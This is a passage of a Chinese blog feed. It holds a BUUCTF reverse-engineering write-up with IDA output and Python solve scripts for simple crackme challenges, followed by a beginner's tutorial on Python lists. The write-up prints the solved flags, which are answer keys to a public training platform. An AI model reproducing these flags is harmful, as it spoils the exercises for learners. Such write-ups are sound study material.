53h ; S</span><br><span class="line">.rdata:0000000000429017                 db  79h ; y</span><br><span class="line">.rdata:0000000000429018                 db  52h ; R</span><br><span class="line">.rdata:0000000000429019                 db  65h ; e</span><br><span class="line">.rdata:000000000042901A                 db  7Dh ; &#125;</span><br><span class="line">.rdata:000000000042901B                 db    0</span><br><span class="line">.rdata:000000000042901C ; char aSorryYouCanTGe[]</span><br><span class="line">.rdata:000000000042901C aSorryYouCanTGe db &apos;sorry,you can&apos;,27h,&apos;t get flag&apos;,0</span><br></pre></td></tr></table></figure><blockquote><p>使用idc脚本跑出flag：</p></blockquote><blockquote><p>这里有详细的介绍：<a href="http://radishes.top/2018/11/18/2018-11-18-IDC%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/" target="_blank" rel="noopener">http://radishes.top/2018/11/18/2018-11-18-IDC%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//在IDC中变量没有明确的类型。</span><br><span class="line">//IDC使用三种数据类型：整形，字符串，浮点型。</span><br><span class="line">//在使用变量前，都必须先声明该变量，并有局部变量和全局变量之分</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//IDC内置函数</span><br><span class="line">//读取数据的函数：</span><br><span class="line">//long Byte(long addr)–&gt;从虚拟地址addr读取一个字节值</span><br><span class="line">//long Word(long addr)–&gt;从虚拟地址读取一个子(2字节)值</span><br><span class="line">//long Dword(longaddr)–&gt;从虚拟地址读取一个双字(4字节值)</span><br><span class="line">//bool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//修改数据的函数</span><br><span class="line"></span><br><span class="line">//void PatchByte(long addr,long val)–&gt;设置虚拟地址处的一个字节值</span><br><span class="line">//void PatchWord(long addr, long val)–&gt;设置虚拟地址处的一个字值</span><br><span class="line">//void PatchDword(long addr, long val)–&gt;设置虚拟地址处的一个双字值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto a = 0x00429005;</span><br><span class="line">auto i,x;</span><br><span class="line">for(i=0;i&lt;(0x42901C-0x429005);i=i+1)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Byte(a);</span><br><span class="line">        Message(&quot;%s&quot;,x);</span><br><span class="line">        a=a+1;</span><br><span class="line">    &#125;</span><br><span class="line">//flag&#123;this_Is_a_EaSyRe&#125;</span><br></pre></td></tr></table></figure><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char *v3; // rsi</span><br><span class="line">  int result; // eax</span><br><span class="line">  signed int i; // [rsp+2Ch] [rbp-124h]</span><br><span class="line">  char v6[264]; // [rsp+40h] [rbp-110h]</span><br><span class="line">  __int64 v7; // [rsp+148h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  memset(v6, 0, 0x100uLL);</span><br><span class="line">  v3 = (char *)256;</span><br><span class="line">  printf(&quot;Input your flag:\n&quot;, 0LL);</span><br><span class="line">  get_line(v6, 256LL);</span><br><span class="line">  if ( strlen(v6) != 33 )</span><br><span class="line">    goto LABEL_12;</span><br><span class="line">  for ( i = 1; i &lt; 33; ++i )</span><br><span class="line">    v6[i] ^= v6[i - 1];</span><br><span class="line">  v3 = global;</span><br><span class="line">  if ( !strncmp(v6, global, 0x21uLL) )          // 将我们输入的字符串  与global相等</span><br><span class="line">    printf(&quot;Success&quot;, v3);</span><br><span class="line">  else</span><br><span class="line">LABEL_12:</span><br><span class="line">    printf(&quot;Failed&quot;, v3);</span><br><span class="line">  result = __stack_chk_guard;</span><br><span class="line">  if ( __stack_chk_guard == v7 )</span><br><span class="line">    result = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进去看下global</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__data:0000000100001050 ; ===========================================================================</span><br><span class="line">__data:0000000100001050</span><br><span class="line">__data:0000000100001050 ; Segment type: Pure data</span><br><span class="line">__data:0000000100001050 ; Segment alignment &apos;qword&apos; can not be represented in assembly</span><br><span class="line">__data:0000000100001050 __data          segment para public &apos;DATA&apos; use64</span><br><span class="line">__data:0000000100001050                 assume cs:__data</span><br><span class="line">__data:0000000100001050                 ;org 100001050h</span><br><span class="line">__data:0000000100001050                 public _global</span><br><span class="line">__data:0000000100001050 ; char *global</span><br><span class="line">__data:0000000100001050 _global         dq offset aFKWOXZUPFVMDGH</span><br><span class="line">__data:0000000100001050                                         ; DATA XREF: _main+10D↑r</span><br><span class="line">__data:0000000100001050 __data          ends                    ; &quot;f\nk\fw&amp;O.@\x11x\rZ;U\x11p\x19F\x1Fv\&quot;M&quot;...</span><br><span class="line">__data:0000000100001050</span><br><span class="line">UNDEF:0000000100001060 ;</span><br></pre></td></tr></table></figure><p>我们把鼠标放到 aFKWOXZUPFVMDGH 上面可以看到下图<br><a href="https://imgchr.com/i/uMT0FU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/28/uMT0FU.png" alt="uMT0FU.png"></a><br>但我怎么也不能将它dump，用idc也不行，纳闷了！没办法，暂时手抄下来吧！在网上查了下，发现别人的ida都可以，为何我的（这次，之前也偶尔出来过这情况）就不行呢！没有找到原因不敢说话！</p><blockquote><p>这题 思路是  我们输入的数据 a[i]^=a[a+1],然后与global数据相等，反着来就行了！<br>我们将 global[i]^global[i-1],这里注意下倒着处理的话，肯定的第一个f会处理不到，手动加上就好。</p></blockquote><blockquote><p>这里涉及到一个函数1.isinsatncce()和2.字符串反转</p></blockquote><blockquote><p>1 :<a href="https://www.runoob.com/python/python-func-isinstance.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-func-isinstance.html</a></p></blockquote><blockquote><p>2 .<a href="https://www.cnblogs.com/jasmine0627/p/9510296.html" target="_blank" rel="noopener">https://www.cnblogs.com/jasmine0627/p/9510296.html</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># a = &quot;&#123;hello_world&#125;&quot;</span><br><span class="line"># for i in range(len(a)):</span><br><span class="line"># if a[i]==&apos;o&apos;:</span><br><span class="line"># print(&quot;0&quot;,end=&quot;&quot;)</span><br><span class="line"># else:</span><br><span class="line"># print(a[i])</span><br><span class="line"></span><br><span class="line">x=&quot;&quot;</span><br><span class="line">a=[&apos;f&apos;,0xA,&apos;k&apos;,0xC,&apos;w&apos;,&apos;&amp;&apos;,&apos;O&apos;,&apos;.&apos;,&apos;@&apos;,0x11,&apos;x&apos;,0xD,&apos;Z&apos;,&apos;;&apos;,&apos;U&apos;,0x11,&apos;p&apos;,0x19,&apos;F&apos;,0x1F,&apos;v&apos;,&apos;&quot;&apos;,&apos;M&apos;,&apos;#&apos;,&apos;D&apos;,0x0E,&apos;g&apos;,0x6,&apos;h&apos;,0x0F,&apos;G&apos;,&apos;2&apos;,&apos;O&apos;]</span><br><span class="line">for i in range(1,len(a)):</span><br><span class="line">    if(isinstance(a[len(a)-i],str)):</span><br><span class="line">        if(isinstance(a[len(a)-(i+1)],str)):</span><br><span class="line">            x+= chr(ord(a[len(a) - i]) ^ ord(a[len(a) - (i+1)]))</span><br><span class="line">        else:</span><br><span class="line">            x+= chr(ord(a[len(a) - i]) ^ a[len(a)-(i + 1)])</span><br><span class="line">    else:</span><br><span class="line">        x+=chr(a[len(a)-i]^ord(a[len(a)-(i+1)]))</span><br><span class="line">print(x)#&#125;uHgnaiJgnoTiY_iaDnaWuiQnaiQ&#123;gal</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">flag=x[::-1]</span><br><span class="line">print(flag)#lag&#123;QianQiuWanDai_YiTongJiangHu&#125;</span><br></pre></td></tr></table></figure><h1 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a>reverse1</h1><p>拖入ida：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_1400118C0()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // rdi</span><br><span class="line">  signed __int64 i; // rcx</span><br><span class="line">  size_t v2; // rax</span><br><span class="line">  size_t v3; // rax</span><br><span class="line">  char v5; // [rsp+0h] [rbp-20h]</span><br><span class="line">  int j; // [rsp+24h] [rbp+4h]</span><br><span class="line">  char Str1; // [rsp+48h] [rbp+28h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+128h] [rbp+108h]</span><br><span class="line"></span><br><span class="line">  v0 = &amp;v5;</span><br><span class="line">  for ( i = 82i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = -858993460;</span><br><span class="line">    v0 += 4;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = 0; ; ++j )//这里Str2=Str2经过一次处理后字符串</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = j_strlen(Str2);</span><br><span class="line">    if ( v8 &gt; v2 )</span><br><span class="line">      break;</span><br><span class="line">    if ( Str2[j] == &apos;o&apos; )</span><br><span class="line">      Str2[j] = &apos;0&apos;;</span><br><span class="line">  &#125;//Str2中的o变成0</span><br><span class="line">  sub_1400111D1(&quot;input the flag:&quot;);//输入字符串</span><br><span class="line">  sub_14001128F((__int64)&quot;%20s&quot;, (__int64)&amp;Str1);//存放在Str1 位置</span><br><span class="line">  v3 = j_strlen(Str2);//输入字符串长度</span><br><span class="line">  if ( !strncmp(&amp;Str1, Str2, v3) )//即要求我么输入字符串必须等于Str2</span><br><span class="line">    sub_1400111D1(&quot;this is the right flag!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_1400111D1(&quot;wrong flag\n&quot;);</span><br><span class="line">  sub_14001113B(&amp;v5, &amp;unk_140019D00);</span><br><span class="line">  return 0i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们看下Str2原始数据:{hello_world}</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = &quot;&#123;hello_world&#125;&quot;</span><br><span class="line">for i in range(len(a)):</span><br><span class="line">if a[i]==&apos;o&apos;:</span><br><span class="line">print(&quot;0&quot;,end=&quot;&quot;)</span><br><span class="line">else:</span><br><span class="line">print(a[i],end=&quot;&quot;)</span><br><span class="line">#&#123;hell0_w0rld&#125;  加上flag 则flag&#123;hell0_w0rld&#125;</span><br></pre></td></tr></table></figure><h1 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a>reverse2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  int stat_loc; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  int i; // [rsp+8h] [rbp-38h]</span><br><span class="line">  __pid_t pid; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  char s2; // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+28h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  pid = fork();</span><br><span class="line">  if ( pid )</span><br><span class="line">  &#123;</span><br><span class="line">    argv = (const char **)&amp;stat_loc;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= strlen(&amp;flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(&amp;flag + i) == &apos;i&apos; || *(&amp;flag + i) == &apos;r&apos; )</span><br><span class="line">        *(&amp;flag + i) = &apos;1&apos;;//很简单，将字符串中的i和r字符替换成 数字 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;input the flag:&quot;, argv);</span><br><span class="line">  __isoc99_scanf(&quot;%20s&quot;, &amp;s2);</span><br><span class="line">  if ( !strcmp(&amp;flag, &amp;s2) )//进去看字符串：&#123;hacking_for_fun&#125;</span><br><span class="line">    result = puts(&quot;this is the right flag!&quot;);</span><br><span class="line">  else</span><br><span class="line">    result = puts(&quot;wrong flag!&quot;);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># a = &quot;&#123;hacking_for_fun&#125;&quot;</span><br><span class="line"># b = &quot;1&quot;</span><br><span class="line"># for i in range(len(a)):</span><br><span class="line">#     if (a[i]==&apos;i&apos;)| (a[i]==&apos;r&apos;):</span><br><span class="line">#         print(b, end=&quot;&quot;)</span><br><span class="line">#     else:</span><br><span class="line">#         print(a[i],end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">x = &quot;&#123;hacking_for_fun&#125;&quot;</span><br><span class="line">y = x.replace(&apos;i&apos;,&apos;1&apos;)</span><br><span class="line">z = y.replace(&apos;r&apos;,&apos;1&apos;)</span><br><span class="line">print(z)</span><br><span class="line">#&#123;hack1ng_fo1_fun&#125;</span><br></pre></td></tr></table></figure><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote><p>这个平台是一朋友推荐的，嗯,前几题简直是送分题！不过听说后面会难起来！<br><img src="https://s2.ax1x.com/2019/09/27/uuZMAU.jpg" alt="uuZMAU.jpg"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天不开心，我怎么也不能原谅自己，这个年纪了，该争取的就该上点心！！！这段时间没有更新博客，后来呢要一天一更！努力跑吧，走着真的来不及！今天开刷BUUCTF！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>python系统学习03</title>
    <link href="http://yoursite.com/2019/09/19/python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A003/"/>
    <id>http://yoursite.com/2019/09/19/python系统学习03/</id>
    <published>2019-09-19T15:55:47.000Z</published>
    <updated>2019-09-19T18:12:40.198Z</updated>
    
    <content type="html"><![CDATA[<p>稳住，我可以的！今天学了脱壳，明天正确把De1CTF的Re_Sign给做出来！</p><a id="more"></a><h1 id="列表："><a href="#列表：" class="headerlink" title="列表："></a>列表：</h1><blockquote><p>列表可以一次性存储多个数据，且可以为不同的数据类型。类似C语言中的数组</p></blockquote><blockquote><p>列表是可变类型</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line">print(name_list)</span><br><span class="line">print(name_list[2])</span><br><span class="line">print(name_list[0])</span><br><span class="line"></span><br><span class="line"># [&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;]</span><br><span class="line"># luobo</span><br><span class="line"># Yang1k</span><br></pre></td></tr></table></figure><h2 id="列表的而常用操作：增删改查"><a href="#列表的而常用操作：增删改查" class="headerlink" title="列表的而常用操作：增删改查"></a>列表的而常用操作：增删改查</h2><h3 id="查："><a href="#查：" class="headerlink" title="查："></a>查：</h3><h4 id="index"><a href="#index" class="headerlink" title="index()"></a>index()</h4><blockquote><p>返回指定数据所在的而下标</p></blockquote><blockquote><p>列表序列.index(数据,开始位置下标,结束位置下表)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">print(name_list.index(&apos;mutou&apos;,0,2))#1</span><br><span class="line"></span><br><span class="line">print(name_list.index(&apos;yangmutou&apos;,0,2))#不存在则报错</span><br></pre></td></tr></table></figure><h4 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h4><blockquote><p>统计指定数据在当前列表中出现的次数。</p></blockquote><blockquote><p>列表序列.count(数据)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">print(name_list.count(&apos;Yang1k&apos;))#1</span><br></pre></td></tr></table></figure><h4 id="len"><a href="#len" class="headerlink" title="len()"></a>len()</h4><blockquote><p>返回列表长度，即列表中的数据的个数</p></blockquote><blockquote><p>语法count(列表)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">print(len(name_list))#3</span><br></pre></td></tr></table></figure><h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4><blockquote><p>判断指定数据在某个列表序列，如果在 返回True，否则返回Flase</p></blockquote><h4 id="not-in"><a href="#not-in" class="headerlink" title="not in"></a>not in</h4><blockquote><p>tongsah</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">print(&apos;luobo&apos; in name_list)#True</span><br><span class="line">print(&apos;Tom&apos; in name_list) #False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&apos;luobo&apos; not in name_list)#False</span><br><span class="line"></span><br><span class="line">print(&apos;Tom&apos; not in name_list)#True</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#小举例：</span><br><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">name=input(&apos;请输入你搜索的名字&apos;)</span><br><span class="line">if name in name_list:</span><br><span class="line">    print(f&apos;您输入的名字是&#123;name&#125;，名字已经存在&apos;)</span><br><span class="line">else:</span><br><span class="line">    print(f&apos;您输入的名字是&#123;name&#125;，名字不存在&apos;)</span><br></pre></td></tr></table></figure><h3 id="增"><a href="#增" class="headerlink" title="增"></a>增</h3><blockquote><p>增加指定数据列表中</p></blockquote><h4 id="append"><a href="#append" class="headerlink" title="append()"></a>append()</h4><blockquote><p>append():列表结尾追加数据</p></blockquote><blockquote><p>语法：列表序列.append(数据)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">name_list.append(&apos;Tom&apos;)</span><br><span class="line"></span><br><span class="line">print(name_list)#[&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;, &apos;Tom&apos;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">name_list.append([&apos;xiaoming&apos;,&apos;xiaohong&apos;])</span><br><span class="line"></span><br><span class="line">print(name_list) #[&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;, [&apos;xiaoming&apos;, &apos;xiaohong&apos;]]</span><br></pre></td></tr></table></figure><blockquote><p>这里注意下append()追加的数据是一个数据，则追加整个序列到列表</p></blockquote><h4 id="extend"><a href="#extend" class="headerlink" title="extend()"></a>extend()</h4><blockquote><p>extend():列表结尾追加数据，如果数据是一个序列，则将这个序列逐一添加到列表</p></blockquote><blockquote><p>语法：列表序列.exterd(数据)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">name_list.extend([&apos;xiaoming&apos;,&apos;xiaohong&apos;])</span><br><span class="line"></span><br><span class="line">print(name_list) #[&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;, &apos;xiaoming&apos;, &apos;xiaohong&apos;]</span><br><span class="line"></span><br><span class="line">name_list.extend(&apos;tom&apos;)</span><br><span class="line">print(name_list)</span><br><span class="line">#[&apos;Yang1k&apos;, &apos;mutou&apos;, &apos;luobo&apos;, &apos;xiaoming&apos;, &apos;xiaohong&apos;, &apos;t&apos;, &apos;o&apos;, &apos;m&apos;]</span><br></pre></td></tr></table></figure><h4 id="insert"><a href="#insert" class="headerlink" title="insert()"></a>insert()</h4><blockquote><p>insert():列表指定位置（下标）追加数据</p></blockquote><blockquote><p>语法：列表序列.insert(位置下表,数据)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">name_list.insert(1,&apos;Tom&apos;)</span><br><span class="line"></span><br><span class="line">print(name_list)#[&apos;Yang1k&apos;,&apos;Tom&apos;,&apos;mutou&apos;, &apos;luobo&apos;]</span><br></pre></td></tr></table></figure><h3 id="删"><a href="#删" class="headerlink" title="删"></a>删</h3><h4 id="del"><a href="#del" class="headerlink" title="del"></a>del</h4><blockquote><p>删除整个列表 或者 列表中指定下表的而数据</p></blockquote><blockquote><p>语法：del 数据</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line">del name_list[1]</span><br><span class="line">print(name_list)</span><br><span class="line"></span><br><span class="line">del name_list</span><br><span class="line">print(name_list)</span><br><span class="line">#name &apos;name_list&apos; is not defined  说明这个列表被删了，不存在了！</span><br></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop()"></a>pop()</h4><blockquote><p>删除列表中指定下表的而数据，如果不指定下标的话，默认删除最后一个数据，这个要注意  删除的数据可以返回</p></blockquote><blockquote><p>语法：列表序列.pop()</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line">a= name_list.pop()</span><br><span class="line"></span><br><span class="line">print(name_list)#[&apos;Yang1k&apos;, &apos;mutou&apos;]</span><br><span class="line">print(a)#luobo</span><br><span class="line"></span><br><span class="line">b=name_list.pop(1)</span><br><span class="line">print(name_list)#[&apos;Yang1k&apos;]</span><br><span class="line">print(b)#mutou</span><br></pre></td></tr></table></figure><h4 id="remove"><a href="#remove" class="headerlink" title="remove()"></a>remove()</h4><blockquote><p>删除列表中指定数据</p></blockquote><blockquote><p>语法：列表序列.remove(数据)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name_list=[&apos;Yang1k&apos;,&apos;mutou&apos;,&apos;luobo&apos;]</span><br><span class="line"></span><br><span class="line">name_list.remove(&apos;mutou&apos;)</span><br><span class="line">print(name_list)#[&apos;Yang1k&apos;, &apos;luobo&apos;]</span><br></pre></td></tr></table></figure><h3 id="改"><a href="#改" class="headerlink" title="改"></a>改</h3><h4 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h4><blockquote><p>排序</p></blockquote><blockquote><p>语法：列表序列.sort(key=None,reverse=False) </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reverse=True：降序</span><br><span class="line">reverse=False：升序（默认）</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 